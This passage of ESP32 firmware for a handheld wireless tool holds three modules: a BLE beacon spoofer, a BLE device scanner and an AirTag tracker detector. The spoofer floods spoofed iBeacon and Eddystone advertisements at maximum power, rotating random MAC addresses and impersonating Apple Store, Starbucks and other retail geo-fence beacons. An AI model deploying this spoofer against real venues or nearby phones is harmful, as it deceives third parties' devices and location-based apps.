    tft.fillRect(0, counterY, SCREEN_WIDTH, SCALE_H(20), TFT_BLACK);

    // Gradient bar
    int barX = SCALE_X(10);
    int barY = counterY + SCALE_H(2);
    int barW = SCALE_W(140);
    int barH = SCALE_H(10);

    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);

    float fillPct = (currentRate > 0) ? (float)currentRate / 12.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            // Cyan to hot pink gradient
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t c = tft.color565(r, g, b);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    // Count text
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", packetCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    // Rate on right
    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), counterY + 3);
    tft.printf("%d bcn/s", currentRate);
}

// Skull row at bottom (matches BleSpoofer pattern)
static int bcnSkullFrame = 0;
static const unsigned char* bcnSkulls[8] = {
    bitmap_icon_skull_wifi, bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer, bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir, bitmap_icon_skull_tools,
    bitmap_icon_skull_setting, bitmap_icon_skull_about
};

static void bcnDrawSkulls() {
    int skullY = SCREEN_HEIGHT - SCALE_H(48);
    int skullStartX = SCALE_X(10);
    int skullSpacing = (SCREEN_WIDTH - SCALE_X(20)) / 8;

    for (int i = 0; i < 8; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, skullY, 16, 16, TFT_BLACK);

        uint16_t color;
        if (beaconing) {
            int phase = (bcnSkullFrame + i) % 8;
            if (phase < 4) {
                float ratio = phase / 3.0f;
                uint8_t r = (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }

        tft.drawBitmap(x, skullY, bcnSkulls[i], 16, 16, color);
    }

    // TX/OFF label
    tft.fillRect(skullStartX + (8 * skullSpacing), skullY, 50, 16, TFT_BLACK);
    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(skullStartX + (8 * skullSpacing) + 5, skullY + 4);
    tft.print(beaconing ? "TX!" : "OFF");

    bcnSkullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// PACKET BUILDERS
// ═══════════════════════════════════════════════════════════════════════════

// Build standard 30-byte iBeacon advertisement payload
// Returns total packet length (always 30)
static int buildIBeaconPacket(uint8_t* buf, const uint8_t* uuid, uint16_t major, uint16_t minor, int8_t txPower) {
    int i = 0;
    // Flags AD structure
    buf[i++] = 0x02;  // Length
    buf[i++] = 0x01;  // Flags type
    buf[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    // Manufacturer Specific Data
    buf[i++] = 0x1A;  // AD Length = 26 bytes follow
    buf[i++] = 0xFF;  // Manufacturer Specific Data type
    buf[i++] = 0x4C;  // Apple Inc (low byte)
    buf[i++] = 0x00;  // Apple Inc (high byte)
    buf[i++] = 0x02;  // iBeacon type
    buf[i++] = 0x15;  // iBeacon data length (21 bytes)
    // UUID (16 bytes)
    memcpy(&buf[i], uuid, 16);
    i += 16;
    // Major (big-endian)
    buf[i++] = (major >> 8) & 0xFF;
    buf[i++] = major & 0xFF;
    // Minor (big-endian)
    buf[i++] = (minor >> 8) & 0xFF;
    buf[i++] = minor & 0xFF;
    // TX Power (calibrated at 1m)
    buf[i++] = (uint8_t)txPower;
    return i;  // 30
}

// Build Eddystone-URL advertisement payload
// Returns total packet length
static int buildEddystoneURL(uint8_t* buf, const char* url) {
    int i = 0;
    // Flags AD structure
    buf[i++] = 0x02;  // Length
    buf[i++] = 0x01;  // Flags type
    buf[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    // Complete 16-bit Service UUID (Eddystone 0xFEAA)
    buf[i++] = 0x03;  // Length
    buf[i++] = 0x03;  // Complete 16-bit UUID list type
    buf[i++] = 0xAA;  // 0xFEAA little-endian low
    buf[i++] = 0xFE;  // 0xFEAA little-endian high
    // Service Data start — length filled at end
    int svcLenPos = i;
    buf[i++] = 0x00;  // Placeholder for service data length
    buf[i++] = 0x16;  // Service Data type
    buf[i++] = 0xAA;  // 0xFEAA little-endian low
    buf[i++] = 0xFE;  // 0xFEAA little-endian high
    // Eddystone-URL frame
    buf[i++] = 0x10;  // Frame type: URL
    buf[i++] = 0xF4;  // TX Power at 0m (-12 dBm typical)
    // URL scheme prefix
    buf[i++] = 0x01;  // "https://www."
    // Encode URL (with .com expansion code per Eddystone spec)
    int urlLen = strlen(url);
    if (urlLen > 17) urlLen = 17;  // Max URL bytes in BLE adv
    for (int u = 0; u < urlLen; u++) {
        // Encode .com as 0x00 per Eddystone spec
        if (u + 3 < urlLen && url[u] == '.' && url[u+1] == 'c' && url[u+2] == 'o' && url[u+3] == 'm') {
            buf[i++] = 0x00;  // .com expansion code
            u += 3;  // Skip past ".com"
        } else {
            buf[i++] = (uint8_t)url[u];
        }
    }
    // Fill in service data length (everything after the length byte)
    buf[svcLenPos] = (uint8_t)(i - svcLenPos - 1);
    return i;
}

// Build Eddystone-UID advertisement payload
// Returns total packet length
static int buildEddystoneUID(uint8_t* buf, const uint8_t* ns, const uint8_t* instance) {
    int i = 0;
    // Flags AD structure
    buf[i++] = 0x02;
    buf[i++] = 0x01;
    buf[i++] = 0x06;
    // Complete 16-bit Service UUID (Eddystone 0xFEAA)
    buf[i++] = 0x03;
    buf[i++] = 0x03;
    buf[i++] = 0xAA;
    buf[i++] = 0xFE;
    // Service Data
    buf[i++] = 0x15;  // Length: 21 bytes follow
    buf[i++] = 0x16;  // Service Data type
    buf[i++] = 0xAA;  // 0xFEAA
    buf[i++] = 0xFE;
    // Eddystone-UID frame
    buf[i++] = 0x00;  // Frame type: UID
    buf[i++] = 0xF4;  // TX Power at 0m
    // Namespace (10 bytes)
    memcpy(&buf[i], ns, 10);
    i += 10;
    // Instance (6 bytes)
    memcpy(&buf[i], instance, 6);
    i += 6;
    // Reserved (2 bytes, must be 0x00)
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    return i;  // 25
}

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE
// ═══════════════════════════════════════════════════════════════════════════

static void doBroadcast() {
    // Stop any current advertising
    esp_ble_gap_stop_advertising();

    // Generate random BLE MAC address
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] |= 0xC0;  // BLE random static address type

    esp_ble_gap_set_rand_addr(addr);

    // Build packet based on current mode
    uint8_t pkt[31];
    int pktLen = 0;
    char logBuf[42];

    switch (currentMode) {
        case BCN_RANDOM_IBEACON: {
            // Random UUID, Major, Minor each cycle
            uint8_t randUUID[16];
            esp_fill_random(randUUID, 16);
            uint16_t major = (uint16_t)random(0xFFFF);
            uint16_t minor = (uint16_t)random(0xFFFF);
            pktLen = buildIBeaconPacket(pkt, randUUID, major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] iBeacon %04X:%04X", major, minor);
            break;
        }
        case BCN_APPLE_STORE: {
            uint16_t major = 1 + (uint16_t)random(50);  // Store section
            uint16_t minor = 1 + (uint16_t)random(200);  // Fixture
            pktLen = buildIBeaconPacket(pkt, UUID_APPLE_STORE, major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] Apple %d:%d", major, minor);
            break;
        }
        case BCN_STARBUCKS: {
            uint16_t major = 100 + (uint16_t)random(900);
            uint16_t minor = 1 + (uint16_t)random(50);
            pktLen = buildIBeaconPacket(pkt, UUID_STARBUCKS, major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] Starbucks %d:%d", major, minor);
            break;
        }
        case BCN_EDDYSTONE_URL: {
            pktLen = buildEddystoneURL(pkt, EDDYSTONE_URL_PRESET);
            snprintf(logBuf, sizeof(logBuf), "[+] Eddy-URL: %s", EDDYSTONE_URL_PRESET);
            break;
        }
        case BCN_EDDYSTONE_UID: {
            uint8_t ns[10];
            uint8_t instance[6];
            esp_fill_random(ns, 10);
            esp_fill_random(instance, 6);
            pktLen = buildEddystoneUID(pkt, ns, instance);
            snprintf(logBuf, sizeof(logBuf), "[+] Eddy-UID %02X%02X:%02X%02X",
                     ns[0], ns[1], instance[0], instance[1]);
            break;
        }
        case BCN_GEO_FENCE: {
            // Cycle through all retail presets rapidly
            int presetIdx = geoFenceStep % GEO_FENCE_PRESET_COUNT;
            uint16_t major = 1 + (uint16_t)random(500);
            uint16_t minor = 1 + (uint16_t)random(500);
            pktLen = buildIBeaconPacket(pkt, GEO_FENCE_UUIDS[presetIdx], major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] GeoF %s %d:%d",
                     GEO_FENCE_NAMES[presetIdx], major, minor);
            geoFenceStep++;
            break;
        }
        default:
            return;
    }

    // Set raw advertising data via ESP-IDF
    esp_ble_gap_config_adv_data_raw(pkt, pktLen);
    delay(1);

    // Start advertising
    esp_ble_gap_start_advertising(&bcnAdvParams);
    delay(20);
    esp_ble_gap_stop_advertising();

    // Update counters
    packetCount++;
    rateWindowCount++;

    // Serial debug for first 5 packets
    if (packetCount <= 5) {
        Serial.printf("[BEACON] TX #%lu mode=%d len=%d addr=%02X:%02X:%02X\n",
            packetCount, currentMode, pktLen, addr[0], addr[1], addr[2]);
    }

    bcnAddLog(logBuf, HALEHOUND_VIOLET);
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 BROADCAST TASK — Runs doBroadcast() as fast as BLE allows
// BLE advertising has inherent ~21ms per cycle (delay(1) + delay(20))
// ═══════════════════════════════════════════════════════════════════════════

static void bcnTxTask(void* param) {
    bcnTaskRunning = true;
    unsigned long rateStart = millis();

    while (beaconing) {
        // Heap safety — BLEAdvertisementData allocates std::string on heap
        if (esp_get_free_heap_size() < 8192) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        doBroadcast();  // Increments packetCount and rateWindowCount

        // Update rate counter every second
        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            currentRate = (uint16_t)rateWindowCount;
            rateWindowCount = 0;
            rateStart = now;
        }

        // Yield — delay(20) in doBroadcast already yields, but belt and suspenders
        vTaskDelay(1);
    }

    bcnTaskRunning = false;
    vTaskDelete(NULL);
}

static void startBcnTask() {
    if (bcnTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(bcnTxTask, "bleBeacon", 8192, NULL, 1, &bcnTaskHandle, 0);
}

static void stopBcnTask() {
    beaconing = false;
    if (bcnTaskHandle == NULL) return;

    // Wait for task to finish (500ms timeout)
    unsigned long start = millis();
    while (bcnTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    // Force kill if task didn't exit cleanly
    if (bcnTaskRunning) {
        vTaskDelete(bcnTaskHandle);
    }

    bcnTaskHandle = NULL;
    bcnTaskRunning = false;

    // Stop any lingering advertising
    esp_ble_gap_stop_advertising();
}

// ═══════════════════════════════════════════════════════════════════════════
// CONTROL FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void startBeacon() {
    beaconing = true;
    rateWindowCount = 0;
    bcnAddLog("[!] BEACON STARTED", HALEHOUND_HOTPINK);
    bcnDrawIconBar();
    bcnDrawHeader();
    bcnDrawLog();

    startBcnTask();  // Launch Core 0 broadcast engine

    #if CYD_DEBUG
    Serial.printf("[BEACON] Started - Mode: %s (Core 0)\n", BCN_MODE_NAMES[currentMode]);
    #endif
}

static void stopBeacon() {
    stopBcnTask();  // Stop Core 0 task first
    bcnAddLog("[!] BEACON STOPPED", HALEHOUND_HOTPINK);
    bcnDrawIconBar();
    bcnDrawHeader();

    #if CYD_DEBUG
    Serial.println("[BEACON] Stopped");
    #endif
}

static void toggleBeacon() {
    if (beaconing) stopBeacon(); else startBeacon();
}

static void nextMode() {
    currentMode = (currentMode + 1) % BCN_MODE_COUNT;
    bcnDrawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", BCN_MODE_NAMES[currentMode]);
    bcnAddLog(buf, HALEHOUND_HOTPINK);
}

static void prevMode() {
    currentMode = (currentMode - 1 + BCN_MODE_COUNT) % BCN_MODE_COUNT;
    bcnDrawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", BCN_MODE_NAMES[currentMode]);
    bcnAddLog(buf, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BEACON] Initializing BLE Beacon...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Kill WiFi — shares 2.4GHz radio with BLE
    // MUST use Arduino API to keep _esp_wifi_started flag in sync
    WiFi.mode(WIFI_OFF);
    delay(200);

    // Initialize BLE — wait for controller ready before TX power
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);  // BLE controller needs time to finish internal init

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    Serial.println("[BEACON] BLE stack initialized, max TX power set");

    // Reset state
    beaconing = false;
    exitRequested = false;
    packetCount = 0;
    currentRate = 0;
    rateWindowCount = 0;
    bcnLogCount = 0;
    bcnSkullFrame = 0;
    geoFenceStep = 0;
    currentMode = BCN_RANDOM_IBEACON;
    bcnTaskHandle = NULL;
    bcnTaskRunning = false;

    // Draw full UI
    bcnDrawIconBar();
    bcnDrawHeader();
    bcnDrawSkulls();
    bcnDrawCounter();

    bcnAddLog("[*] BLE Beacon ready", HALEHOUND_MAGENTA);
    char modeBuf[42];
    snprintf(modeBuf, sizeof(modeBuf), "[*] Mode: %s", BCN_MODE_NAMES[currentMode]);
    bcnAddLog(modeBuf, HALEHOUND_MAGENTA);
    bcnDrawLog();

    lastDisplayUpdate = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[BEACON] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING
    // Icons: Back=10, Toggle=70, PrevMode=140, NextMode=200
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            waitForTouchRelease();

            // Back icon (x=10)
            if (tx >= SCALE_X(5) && tx <= SCALE_X(30)) {
                if (beaconing) stopBeacon();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=70)
            else if (tx >= SCALE_X(60) && tx <= SCALE_X(90)) {
                toggleBeacon();
                return;
            }
            // Prev mode icon (x=140)
            else if (tx >= SCALE_X(130) && tx <= SCALE_X(160)) {
                prevMode();
                return;
            }
            // Next mode icon (x=200)
            else if (tx >= SCALE_X(190) && tx <= SCALE_X(220)) {
                nextMode();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (beaconing) stopBeacon();
        exitRequested = true;
        return;
    }

    // Button navigation
    if (buttonPressed(BTN_LEFT)) prevMode();
    if (buttonPressed(BTN_RIGHT)) nextMode();
    if (buttonPressed(BTN_SELECT)) toggleBeacon();

    // Broadcast engine runs on Core 0 (bcnTxTask)
    // Rate calculation also runs on Core 0

    // Feed the watchdog
    yield();

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE (~10fps)
    // ═══════════════════════════════════════════════════════════════════════
    if (millis() - lastDisplayUpdate >= 100) {
        bcnDrawSkulls();
        bcnDrawCounter();
        bcnDrawLog();
        bcnDrawRate();  // Lightweight — only rate + pkt count, no full header clear
        lastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    stopBcnTask();  // Stop Core 0 task before BLE teardown

    BLEDevice::deinit(false);  // false = library bug: deinit(true) never resets initialized flag

    initialized = false;
    exitRequested = false;
    bcnLogDirty = false;
    bcnLogCount = 0;

    #if CYD_DEBUG
    Serial.println("[BEACON] Cleanup complete");
    #endif
}

}  // namespace BleBeacon

// ═══════════════════════════════════════════════════════════════════════════
// BLE SCAN IMPLEMENTATION - Bluetooth Device Scanner
// ═══════════════════════════════════════════════════════════════════════════

namespace BleScan {

#define MAX_VISIBLE_DEVICES 12
#define DEVICE_LINE_HEIGHT 16

static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;

static BLEScan* pBleScan = nullptr;
static BLEScanResults scanResults;

static int currentIndex = 0;
static int listStartIndex = 0;
static int deviceCount = 0;

// Icon bar - MATCHES ORIGINAL (2 icons: undo at x=210, back at x=10)
#define BSCAN_ICON_SIZE 16
#define BSCAN_ICON_NUM 2
static int bscanIconX[BSCAN_ICON_NUM] = {210, 10};
static int bscanIconY = ICON_BAR_Y;

// Draw icon bar - MATCHES ORIGINAL ESP32-DIV
static void drawBleScanUI() {
    tft.drawLine(0, ICON_BAR_TOP, tft.width(), ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(SCALE_X(140), ICON_BAR_Y, SCREEN_WIDTH - SCALE_X(140), ICON_BAR_H, HALEHOUND_GUNMETAL);
    tft.drawBitmap(bscanIconX[0], bscanIconY, bitmap_icon_undo, BSCAN_ICON_SIZE, BSCAN_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawBitmap(bscanIconX[1], bscanIconY, bitmap_icon_go_back, BSCAN_ICON_SIZE, BSCAN_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// Draw device list
static void drawDeviceList() {
    tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, HALEHOUND_BLACK);

    deviceCount = scanResults.getCount();

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 45);
    tft.print("BLE Devices: ");
    tft.print(deviceCount);

    if (deviceCount == 0) {
        tft.setCursor(10, 70);
        tft.print("No devices found");
        tft.setCursor(10, 85);
        tft.print("Press SELECT to scan");
        return;
    }

    int y = 60;
    for (int i = 0; i < MAX_VISIBLE_DEVICES && i + listStartIndex < deviceCount; i++) {
        int idx = i + listStartIndex;
        BLEAdvertisedDevice device = scanResults.getDevice(idx);

        String name;
        if (device.getName().length() > 0) {
            name = String(device.getName().c_str()).substring(0, 16);
        } else if (device.haveManufacturerData()) {
            std::string mfg = device.getManufacturerData();
            if (mfg.length() >= 2) {
                uint16_t cid = (uint8_t)mfg[0] | ((uint8_t)mfg[1] << 8);
                const char* cn = lookupCompanyName(cid);
                name = cn ? String("[") + cn + "]" : "Unknown";
            } else {
                name = "Unknown";
            }
        } else {
            name = "Unknown";
        }

        if (idx == currentIndex) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, DEVICE_LINE_HEIGHT, HALEHOUND_DARK);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(5, y);
            tft.print("> ");
        } else {
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(5, y);
            tft.print("  ");
        }

        tft.setCursor(20, y);
        tft.print(name);

        tft.setCursor(SCREEN_WIDTH - 50, y);
        tft.print(device.getRSSI());
        tft.print("dB");

        y += DEVICE_LINE_HEIGHT;
    }

    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DOWN=Nav SELECT=Details/Scan");
}

// Draw device details
static void drawDeviceDetails() {
    tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, HALEHOUND_BLACK);

    if (deviceCount == 0 || currentIndex >= deviceCount) return;

    BLEAdvertisedDevice device = scanResults.getDevice(currentIndex);

    String name;
    if (device.getName().length() > 0) {
        name = String(device.getName().c_str());
    } else if (device.haveManufacturerData()) {
        std::string mfg = device.getManufacturerData();
        if (mfg.length() >= 2) {
            uint16_t cid = (uint8_t)mfg[0] | ((uint8_t)mfg[1] << 8);
            const char* cn = lookupCompanyName(cid);
            name = cn ? String("[") + cn + " Device]" : "Unknown Device";
        } else {
            name = "Unknown Device";
        }
    } else {
        name = "Unknown Device";
    }
    String address = String(device.getAddress().toString().c_str());
    int rssi = device.getRSSI();
    int txPower = device.getTXPower();

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 45);
    tft.print("Device Details");

    tft.setTextColor(HALEHOUND_BRIGHT);
    int y = 65;

    tft.setCursor(10, y); tft.print("Name: "); tft.print(name.substring(0, 20));
    y += 18;
    tft.setCursor(10, y); tft.print("MAC: "); tft.print(address);
    y += 18;
    tft.setCursor(10, y); tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");
    y += 18;
    tft.setCursor(10, y); tft.print("TX Power: "); tft.print(txPower); tft.print(" dBm");
    y += 18;

    if (device.haveServiceUUID()) {
        tft.setCursor(10, y);
        tft.print("UUID: ");
        tft.print(String(device.getServiceUUID().toString().c_str()).substring(0, 20));
    } else {
        tft.setCursor(10, y);
        tft.print("No Service UUID");
    }
    y += 18;

    if (device.haveManufacturerData()) {
        tft.setCursor(10, y);
        tft.print("Has Manufacturer Data");
    } else {
        tft.setCursor(10, y);
        tft.print("No Manufacturer Data");
    }

    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK=Return to list");
}

// Show scanning animation
static void showScanning() {
    tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 50);
    tft.print("[*] Scanning for BLE devices...");
}

void startScan() {
    showScanning();
    scanning = true;

    scanResults = pBleScan->start(5, false);
    deviceCount = scanResults.getCount();
    currentIndex = 0;
    listStartIndex = 0;

    scanning = false;
    drawDeviceList();
}

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BLESCAN] Initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawBleScanUI();

    // Tear down WiFi before BLE init — frees ~50KB heap
    WiFi.mode(WIFI_OFF);
    delay(50);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);  // BLE controller needs time after deinit/reinit cycle

    pBleScan = BLEDevice::getScan();
    if (!pBleScan) {
        Serial.println("[BLESCAN] ERROR: getScan() returned NULL");
        exitRequested = true;
        return;
    }
    pBleScan->setActiveScan(true);

    detailView = false;
    exitRequested = false;
    initialized = true;

    startScan();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.println("[BLESCAN] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // Icon bar touch handling - undo at x=210, back at x=10
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM) {
                // Back icon at x=10-26
                if (tx >= 10 && tx < 26) {
                    if (detailView) {
                        detailView = false;
                        drawDeviceList();
                        waitForTouchRelease();  // Eat touch so .ino isBackButtonTapped() doesn't double-fire
                    } else {
                        exitRequested = true;
                    }
                    lastIconTap = millis();
                    return;
                }
                // Undo/Rescan icon at x=210-226
                else if (tx >= 210 && tx < 226) {
                    startScan();
                    lastIconTap = millis();
                    return;
                }
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (detailView) {
            detailView = false;
            drawDeviceList();
            waitForTouchRelease();  // Eat touch so .ino doesn't double-fire exit
        } else {
            exitRequested = true;
        }
        return;
    }

    if (detailView) {
        // Detail view - LEFT to go back
        if (buttonPressed(BTN_LEFT)) {
            detailView = false;
            drawDeviceList();
            waitForTouchRelease();
        }
    } else {
        // List view
        if (buttonPressed(BTN_UP)) {
            if (currentIndex > 0) {
                currentIndex--;
                if (currentIndex < listStartIndex) listStartIndex--;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (currentIndex < deviceCount - 1) {
                currentIndex++;
                if (currentIndex >= listStartIndex + MAX_VISIBLE_DEVICES) listStartIndex++;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_RIGHT)) {
            if (deviceCount > 0) {
                detailView = true;
                drawDeviceDetails();
            }
        }

        if (buttonPressed(BTN_SELECT)) {
            if (deviceCount > 0 && !detailView) {
                detailView = true;
                drawDeviceDetails();
            } else {
                startScan();
            }
        }

        if (buttonPressed(BTN_LEFT)) {
            startScan();
        }

        // Touch to select device
        int touched = getTouchedMenuItem(60, DEVICE_LINE_HEIGHT, min(MAX_VISIBLE_DEVICES, deviceCount - listStartIndex));
        if (touched >= 0) {
            currentIndex = listStartIndex + touched;
            detailView = true;
            drawDeviceDetails();
        }
    }
}

int getDeviceCount() { return deviceCount; }
bool isScanning() { return scanning; }
bool isDetailView() { return detailView; }
bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pBleScan) pBleScan->stop();
    BLEDevice::deinit(false);  // false = keep BLE memory so reinit works
    initialized = false;
    exitRequested = false;

    // Restore WiFi for other modules
    WiFi.mode(WIFI_STA);

    #if CYD_DEBUG
    Serial.println("[BLESCAN] Cleanup complete");
    #endif
}

}  // namespace BleScan


// ═══════════════════════════════════════════════════════════════════════════
// AIRTAG DETECTOR - Apple FindMy Tracker Detection
// Scans BLE advertisements for Apple FindMy network devices:
//   - AirTags, FindMy accessories, OpenHaystack clones
//   - Detects manufacturer data: Company 0x004C, Type 0x12, Len 0x19
//   - Extracts battery level from status byte (bits 6-7)
//   - Tracks unique devices by MAC with proximity RSSI bars
//   - Auto-rescan every 5 seconds, alert flash on new tracker
// ═══════════════════════════════════════════════════════════════════════════

namespace AirTagDetect {

#define AT_MAX_TRACKERS    20
#define AT_MAX_VISIBLE     10
#define AT_LINE_HEIGHT     18
#define AT_SCAN_DURATION   4
#define AT_RESCAN_INTERVAL 5000
#define AT_ICON_SIZE       16

// Tracked device struct
struct TrackedTag {
    uint8_t mac[6];
    int rssi;
    uint8_t battery;      // 0=full, 1=medium, 2=low, 3=critical
    uint8_t statusByte;
    unsigned long firstSeen;
    unsigned long lastSeen;
    bool isNew;
};

static TrackedTag trackers[AT_MAX_TRACKERS];
static int trackerCount = 0;
static int currentIndex = 0;
static int listStartIndex = 0;

static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;
static bool alertFlash = false;
static unsigned long lastScanTime = 0;
static unsigned long alertStart = 0;
static int totalScans = 0;

static BLEScan* pAtScan = nullptr;

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static String macToStr(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static const char* batteryStr(uint8_t level) {
    switch (level) {
        case 0: return "FULL";
        case 1: return "MED";
        case 2: return "LOW";
        case 3: return "CRIT";
        default: return "???";
    }
}

static uint16_t batteryColor(uint8_t level) {
    switch (level) {
        case 0: return HALEHOUND_GREEN;
        case 1: return HALEHOUND_MAGENTA;
        case 2: return HALEHOUND_HOTPINK;
        case 3: return 0xF800;  // Red
        default: return HALEHOUND_GUNMETAL;
    }
}

// Find existing tracker by MAC, returns index or -1
static int findTracker(const uint8_t* mac) {
    for (int i = 0; i < trackerCount; i++) {
        if (memcmp(trackers[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

// Add or update a tracked device
static bool addOrUpdateTracker(const uint8_t* mac, int rssi, uint8_t battery, uint8_t status) {
    int idx = findTracker(mac);
    if (idx >= 0) {
        // Update existing
        trackers[idx].rssi = rssi;
        trackers[idx].battery = battery;
        trackers[idx].statusByte = status;
        trackers[idx].lastSeen = millis();
        trackers[idx].isNew = false;
        return false;  // Not new
    }
    if (trackerCount >= AT_MAX_TRACKERS) return false;

    // Add new tracker
    memcpy(trackers[trackerCount].mac, mac, 6);
    trackers[trackerCount].rssi = rssi;
    trackers[trackerCount].battery = battery;
    trackers[trackerCount].statusByte = status;
    trackers[trackerCount].firstSeen = millis();
    trackers[trackerCount].lastSeen = millis();
    trackers[trackerCount].isNew = true;
    trackerCount++;
    return true;  // New tracker found
}

// Estimate distance from RSSI
static const char* proximityStr(int rssi) {
    if (rssi > -40) return "< 1m";
